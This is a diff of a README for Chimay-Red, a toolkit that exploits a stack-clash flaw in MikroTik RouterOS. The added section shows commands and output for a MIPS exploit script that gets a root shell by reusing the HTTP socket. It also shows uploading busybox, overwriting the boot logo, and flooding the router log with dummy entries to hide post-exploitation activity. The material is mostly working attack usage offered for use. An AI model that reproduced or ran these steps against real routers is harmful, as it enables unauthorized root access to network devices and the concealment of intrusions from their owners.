@@ -115,7 +115,61 @@ Escape character is '^]'.
 
 MikroTik v6.38.4 (stable)
 / #
+```  
+
+## StackClash_resock_mips  
+Reuse the http socket to spawn a shell, so you can have a shell without a reverse connection.  
 ```
+$ ./tools/getROSbin.py 6.38.4 mipsbe /nova/bin/www www_binary
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary
+[...]
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+```  
+### Upload binaries without a reverse shell
+To upload `busybox-mips` in `/ram/busybox`  
+```
+$ wget https://busybox.net/downloads/binaries/1.28.1-defconfig-multiarch/busybox-mips  
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary busybox-mips /ram/busybox   
+[...]   
+Uploading busybox-mips in /ram/busybox...   
+Upload done!
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+chmod 777 /ram/busybox
+/ram/busybox
+BusyBox v1.28.1 (2018-02-15 14:34:02 CET) multi-call binary.
+[...]
+```
+
+### Change boot logo
+Only RGB Bitmap 24 bit (not compressed) files are supported.  
+Max size: 160px width, 76px height  
+You can find a sample [here](docs/logo.bmp)  
+```
+$ ./StackClash_resock_mips.py 192.168.8.1 80 www_binary docs/logo.bmp /flash/boot/logo.bmp  
+[...]
+Uploading docs/logo.bmp in /flash/boot/logo.bmp...
+Upload done!
+sh: turning off NDELAY mode
+
+Got root ;-)
+
+reboot
+*** Connection closed by remote host ***
+```
+![image](https://github.com/BigNerd95/Chimay-Red/raw/master/docs/boot_image.jpg)
+
+### Hide logs
+To remove logs after your post exploitation actions
+```
+/ # /nova/bin/info ":for i from=1 to=1000 do={ :log info message='Some dummy info' }"
+```
+
 # FAQ
 ## Where does one get the chimay-red.py file, that this tool kit relies on?  
 This is a reverse engineering of leaked CIA documentation.  
@@ -165,8 +219,8 @@ I think the CIA tool was using MNDP (Mikrotik Network Discovery Protocol), but i
 So I didn't include the architecture discovery in my tool.  
 You have to test all the archtecture if you are remotely or use a MNDP tool if you in the same LAN (there are a lots of MNDP tools on github).  
 
-## Others architectures than x86 and MIPSBE
-I have no boards based on ARM, TILE, SMIPS, PowerPC, MMIPS and MIPSLE, so I can't debug the vulnerability on these versions.  
+## Others architectures than x86 and MIPSBE/SMIPS
+I have no boards based on ARM, TILE, PowerPC and MMIPS, so I can't debug the vulnerability on these versions.  
 
 (Probably for the last one it is enough to convert the mipsbe addresses in little endian).  
 If you can support other arch then send a PR!  
